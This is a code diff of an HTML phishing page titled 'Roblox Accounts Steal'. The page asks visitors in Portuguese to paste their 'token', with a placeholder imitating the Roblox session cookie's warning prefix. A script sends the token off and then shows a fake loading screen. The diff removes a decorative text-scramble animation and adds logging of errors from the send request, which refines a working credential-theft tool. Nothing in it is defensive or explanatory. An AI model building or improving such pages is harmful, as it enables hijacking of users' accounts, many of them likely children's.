@@ -5,10 +5,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Roblox Accounts Steal</title>
 
-  <!-- GSAP + plugins via CDN -->
+  <!-- GSAP básico (opcional, só pra animações leves se quiser) -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/SplitText.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/ScrambleTextPlugin.min.js"></script>
 
   <style>
     body {
@@ -19,7 +17,6 @@
       font-family: Arial, sans-serif;
       min-height: 100vh;
       overflow-x: hidden;
-      cursor: default;
     }
 
     .container {
@@ -68,22 +65,16 @@
       align-items: center;
     }
 
-    h1, .scrambled-subtitle {
+    h1 {
       font-size: 3.2em;
       color: #ffffff;
       margin-bottom: 20px;
-      text-shadow: 0 0 10px rgba(255,255,255,0.3);
     }
 
-    .scrambled-subtitle {
+    .subtitle {
       font-size: 1.6em;
       color: #b0b0b0;
       margin-bottom: 30px;
-    }
-
-    /* Estilo para letras individuais do scramble */
-    .char {
-      display: inline-block;
     }
 
     input, button {
@@ -193,7 +184,6 @@
       .video-sidebar { width: 100%; }
       #main-content { padding: 40px 20px; }
       #video-right { order: 2; }
-      body { cursor: default; }
     }
   </style>
 </head>
@@ -208,15 +198,8 @@
     </div>
 
     <div id="main-content">
-      <!-- Título com scramble -->
-      <div class="scrambled-text">
-        <h1>Roblox Accounts Steal</h1>
-      </div>
-
-      <!-- Subtítulo com scramble -->
-      <div class="scrambled-text">
-        <p class="subtitle">Insira o token aqui</p>
-      </div>
+      <h1>Roblox Accounts Steal</h1>
+      <p class="subtitle">Insira o token aqui</p>
 
       <input type="text" id="token" placeholder="_|WARNING:_DO-NOT-SHARE-THIS._ ..." />
       <br>
@@ -257,62 +240,6 @@
   </div>
 
   <script>
-    // Inicializa o efeito ScrambledText (adaptado do seu código React para vanilla JS)
-    gsap.registerPlugin(SplitText, ScrambleTextPlugin);
-
-    document.querySelectorAll('.scrambled-text').forEach(block => {
-      const textElement = block.querySelector('h1, p');
-      if (!textElement) return;
-
-      const split = new SplitText(textElement, { type: 'chars', charsClass: 'char' });
-      const chars = split.chars;
-
-      chars.forEach(char => {
-        gsap.set(char, {
-          display: 'inline-block',
-          attr: { 'data-content': char.innerHTML }
-        });
-      });
-
-      const radius = 120;      // distância que ativa o scramble
-      const duration = 1.2;    // duração do scramble
-      const speed = 0.5;       // velocidade do embaralhamento
-      const scrambleChars = '.:'; // caracteres usados no scramble
-
-      const handleMove = e => {
-        chars.forEach(char => {
-          const rect = char.getBoundingClientRect();
-          const cx = rect.left + rect.width / 2;
-          const cy = rect.top + rect.height / 2;
-          const dx = e.clientX - cx;
-          const dy = e.clientY - cy;
-          const dist = Math.hypot(dx, dy);
-
-          if (dist < radius) {
-            gsap.to(char, {
-              duration: duration * (1 - dist / radius),
-              scrambleText: {
-                text: char.dataset.content || '',
-                chars: scrambleChars,
-                speed: speed
-              },
-              ease: 'none',
-              overwrite: true
-            });
-          }
-        });
-      };
-
-      block.addEventListener('pointermove', handleMove);
-
-      // Cleanup (opcional, mas bom ter)
-      window.addEventListener('unload', () => {
-        block.removeEventListener('pointermove', handleMove);
-        split.revert();
-      });
-    });
-
-    // Resto do script (enviar, loading, modal) permanece igual
     function showLoading() {
       document.querySelector('.container').style.display = "none";
       document.getElementById("loading").style.display = "flex";
@@ -356,8 +283,9 @@
         status.innerHTML = "";
         showLoading();
       })
-      .catch(() => {
-        status.innerHTML = "Falha ao enviar. Tente novamente.";
+      .catch(err => {
+        console.error("Erro no fetch:", err);
+        status.innerHTML = "Falha ao enviar. Veja o console (F12).";
         status.style.color = "#888888";
         btn.disabled = false;
         btn.innerText = "Enviar token";
